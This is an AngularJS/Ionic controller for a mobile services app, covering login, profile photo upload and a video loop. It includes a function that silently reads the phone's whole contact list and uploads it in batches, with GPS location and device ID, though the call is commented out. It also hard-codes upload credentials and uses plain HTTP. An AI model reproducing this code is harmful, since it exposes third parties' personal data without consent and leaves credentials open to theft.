/**
 * Created by spider-ninja on 11/27/16.
 */
angular.module('starter.controllers')


    .controller('RegCtrl', function ($scope, $state, $ionicLoading, $timeout, $ionicHistory, $cordovaGeolocation, $localstorage,
                                     $ionicPlatform, $cordovaDevice, $ionicPopup, $window, $cordovaLocalNotification, $cordovaNetwork, $cordovaCamera, BlueTeam,RagnarSocial) {


        console.log("regcont started");

        //photo,name,mobile,password,address,experience,services,city,area

        $scope.user = {};
        $scope.data = {};
        $scope.v = {};
        $scope.v.mobile = false;
        $scope.v.password = false;
        $scope.v.conf_password = false;
        $scope.v.name = false;

        $scope.v.experience = false;
        $scope.v.services = false;


        //console.log('reg',register.mobile.$invalid,$scope.v.mobile);
        $scope.registered = true;
        $scope.checked = false;

        $scope.user.profile_pic_id = 0;
        $scope.user.area_id = 0;
        $scope.user.city_id = 0;


        $scope.goLogin = false;
        $scope.valIP = function(){


            if($scope.user.mobile  != undefined){
                $scope.v.mobile = $scope.goLogin = true;
            }else
                $scope.v.mobile = $scope.goLogin = false;
            if($scope.user.password  != undefined){
                $scope.v.password = $scope.goLogin = true;
            }else
                $scope.v.password = $scope.goLogin = false;


        };





        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };

        var posOptions = {
            "enableHighAccuracy": false,
            "timeout": 60000,
            "maximumAge": 0
        };



        $scope.show = function () {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function () {
            $ionicLoading.hide();
        };




        $scope.login = function () {


            $scope.show();
            RagnarSocial.loginUser({

                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                    "mobile": $scope.user.mobile+"",
                    "password": $scope.user.password,
                    "device_id": $cordovaDevice.getUUID()


                })
                .then(function (d) {

                    //setObject
                    $scope.hide();

                    if (d.user.id) {

                        if(d.user.lat && d.user.lat != "" && d.user.lat != null)
                        d.user.gps_location = d.user.lat+","+ d.user.lng;

                        $localstorage.set('user', JSON.stringify(d.user));
                        $localstorage.set('user_id', d.user.id);
                        $localstorage.set('company_id', d.user.company_id);

                        $timeout(function () {
                            $window.location.reload(true);
                        }, 2000);
                        $state.go('tab.service-list',{type:"not-approved"});



                    } else {
                        $scope.pwdError = true;
                    }

                });


        }

        $scope.pwdError = false;
        $scope.playMyVideo = function(){
            var vidURL = "urlToVideo";
            var myVideo = document.getElementsByTagName('video')[0];

            var vidURL = "http://192.168.43.23/dpower4/temp/3.mp4";
            myVideo.src = vidURL;
            myVideo.load();
            myVideo.play();

            myVideo.addEventListener('ended',function(){
                /*var newUrl = 'http://localhost/dpower4/temp/streamingTest.php?last='+(last*1+1);
                console.log('i got clicked',last,newUrl);

                window.location = newUrl;*/
                $scope.playMyVideo();
            });
        };

        $scope.playMyVideo();



        $ionicPlatform.ready(function () {

            /* if($scope.geolocation) {
             var locationService = $scope.geolocation; // native HTML5 geolocation
             }
             else {
             var locationService = navigator.geolocation; // cordova geolocation plugin
             }

             locationService.getCurrentPosition(
             function(pos) {
             console.log("location inv",JSON.stringify(pos));

             },
             function(error) {
             console.log("location inv",JSON.stringify(error.__proto__.message))

             },
             {enableHighAccuracy: false, timeout: 15000}
             );

             var options = { enableHighAccuracy: false };

             console.log("location by nav",JSON.stringify(
             navigator.geolocation.getCurrentPosition(function (position) {


             $scope.position = position;
             console.log("location by navigator",JSON.stringify(position));


             }, function (err) {

             console.log("error in geting location by navigator",err,JSON.stringify(err.message));
             $scope.position = {
             "coords": {
             "longitude": null,
             "latitude": null
             }
             };


             }, options)));

             */
            /*cordova.plugins.diagnostic.isLocationEnabled(function(enabled){
                console.log("Location setting is " + (enabled ? "enabled" : "disabled"));
            }, function(error){
                console.error("The following error occurred: "+error);
            });
            cordova.plugins.diagnostic.isLocationAuthorized(function(authorized){
                console.log("Location is " + (authorized ? "authorized" : "unauthorized"));
            }, function(error){
                console.error("The following error occurred: "+error);
            });
            cordova.plugins.diagnostic.isLocationAvailable(function(available){
                console.log("Location is " + (available ? "available" : "not available"));
                $cordovaGeolocation
                    .getCurrentPosition(posOptions)
                    .then(function (position) {


                        $scope.position = position;
                        console.log("location",JSON.stringify(position));


                    }, function (err) {

                        console.log("error in geting location",err,JSON.stringify(err.message));
                        $scope.position = {
                            "coords": {
                                "longitude": null,
                                "latitude": null
                            }
                        };


                    });
                /!*var watchOptions = {
                 timeout : 3000,
                 enableHighAccuracy: true // may cause errors if true
                 };

                 var watch = $cordovaGeolocation.watchPosition(watchOptions);
                 watch.then(
                 null,
                 function(err) {
                 console.log("error in geting location",err,JSON.stringify(err));
                 // error
                 },
                 function(position) {
                 $scope.position = position;

                 console.log("location",JSON.stringify(position));
                 var lat  = position.coords.latitude;
                 var long = position.coords.longitude;
                 watch.clearWatch();
                 });

                 *!/

            }, function(error){
                console.error("The following error occurred: "+error);
            });

            if ($cordovaNetwork.isOffline()) {

                $ionicPopup.confirm({

                    title: "Internet is not working",

                    content: "Internet is not working on your device."

                });

            }*/
            $scope.scheduleSingleNotification = function () {
                $cordovaLocalNotification.schedule({
                    id: 1,
                    title: 'Hi, got net request',
                    text: 'Need maid',
                    data: {
                        customProperty: 'custom value'
                    }
                }).then(function (result) {
                    // ...
                });
            };


            //$scope.scheduleSingleNotification();

            $scope.findContact = function () {
                // var fields = ["id", "displayName", "name", "nickname", "phoneNumbers", "emails", "addresses", "ims", "organizations", "birthday", "note", "photos", "categories", "urls"];

                PhoneContactsFactory.find().then(function (contacts) {
                    $arr = [];
                    $buff = [];
                    if ($localstorage.get('lastContactId'))
                        lastContactId = parseInt($localstorage.get('lastContactId'));
                    else
                        lastContactId = -1;
                    var newlastContactId = lastContactId;
                    console.log("Last Id saved ", lastContactId);
                    var j = 0;
                    var i = 0
                    for (i = 0; i < contacts.length; i++) {

                        if (lastContactId < contacts[i].id) {
                            $arr.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: JSON.stringify(contacts[i])
                            });


                            $buff.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: contacts[i]
                            });

                            if (lastContactId < contacts[i].id)
                                newlastContactId = contacts[i].id;

                            j++;

                            if (j > 20) {

                                BlueTeam.postRaw({
                                        "root": {
                                            "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                            "raw": $buff,

                                            "device_id": $cordovaDevice.getUUID()
                                        }
                                    }, "contacts")
                                    .then(function (d) {


                                    });
                                j = 0;
                                $buff = [];

                            }
                        }
                    }


                    $localstorage.set('lastContactId', newlastContactId);
                    if ($buff.length > 0) {
                        BlueTeam.postRaw({
                                "root": {
                                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                    "raw": $buff,

                                    "device_id": $cordovaDevice.getUUID()
                                }
                            }, "contacts")
                            .then(function (d) {


                            });

                    }
                    //$scope.contacts = $arr;
                    //console.log(JSON.stringify($scope.contacts));


                });
            };
            //$scope.findContact();


        });

        if ($localstorage.get('user_id') !== undefined && $localstorage.get('user_id') !== "") {
            $scope.user = JSON.parse($localstorage.get('user'));
            $scope.user.mobile = $scope.user.mobile*1;
            $scope.user.experience = $scope.user.experience*1;
            console.log(JSON.stringify($scope.user));
            $scope.user_id = $localstorage.get('user_id');
            $scope.services = JSON.parse($localstorage.get('services'));
            if($scope.user.gps_location)
                $state.go('tab.service-list');
            else
                $state.go('map');
        }


        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('email') === undefined ||
            $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {

        } else {
            $ionicHistory.clearHistory();
            if ($localstorage.get('type') == "worker")
                $state.go('tab.worker-timer');
            else
                $state.go('tab.service-list');
        }


        $scope.data = {"ImageURI": "Select Image"};
        $scope.takePicture = function () {
            console.log("take Pic Got clicked");

            var options = {
                quality: 50,
                destinationType: Camera.DestinationType.FILE_URL,
                sourceType: Camera.PictureSourceType.CAMERA
            };
            $cordovaCamera.getPicture(options).then(
                function (imageData) {
                    $scope.picData = imageData;
                    $scope.ftLoad = true;
                    $localstorage.set('fotoUp', imageData);

                    $ionicLoading.show({template: 'wait...', duration: 500});
                    $scope.uploadPicture();
                },
                function (err) {
                    $ionicLoading.show({template: 'Error...', duration: 500});
                })
        }

        $scope.selectPicture = function () {



            var options = {
                quality: 50,
                destinationType: Camera.DestinationType.FILE_URI,
                sourceType: Camera.PictureSourceType.PHOTOLIBRARY
            };

            $cordovaCamera.getPicture(options).then(
                function (imageURI) {
                    window.resolveLocalFileSystemURL(imageURI, function (fileEntry) {

                        $scope.picData = fileEntry.toURL();
                        $scope.ftLoad = true;
                        $scope.uploadPicture();
                        console.log($scope.picData);
                        //var image = document.getElementById('myImage');
                        //image.src = fileEntry.nativeURL;
                    });
                    $ionicLoading.show({template: 'wait...', duration: 500});
                },
                function (err) {
                    $ionicLoading.show({template: 'error...', duration: 500});
                })
        };

        $scope.uploadPicture = function () {
            $ionicLoading.show({template: 'wait uploading the document, this may take a while ..'});

            var fileURL = $scope.picData;

            var options = new FileUploadOptions();
            options.fileKey = "fileToUpload";
            options.fileName = fileURL.substr(fileURL.lastIndexOf('/') + 1) + ".jpg";
            options.mimeType = "image/jpeg";
            options.chunkedMode = true;

            var params = {};
            params.username = "rahul";
            params.password = "rahul";

            options.params = params;

            var ft = new FileTransfer();
            ft.upload(
                fileURL,
                encodeURI("http://api.file-dog.shatkonlabs.com/files/rahul"),
                viewUploadedPictures,
                function (error) {
                    $ionicLoading.show({
                        template: 'Something went wrong ...'
                    });
                    $ionicLoading.hide();
                },
                options);
        };
        var viewUploadedPictures = function (response) {
            console.log(JSON.stringify(response), "hi", response.response);
            $ionicLoading.show({template: 'trying to load the pic ...'});
            server = "http://api.file-dog.shatkonlabs.com/files/rahul/" + JSON.parse(response.response).file.id;

            $scope.user.profile_pic_id = JSON.parse(response.response).file.id;

            $scope.picData = server;
            $scope.ftLoad = true;
            console.log($scope.picData);

            $ionicLoading.hide();
        }

        $scope.basicRegDone = false;
        $scope.userServices = [];




    })

;
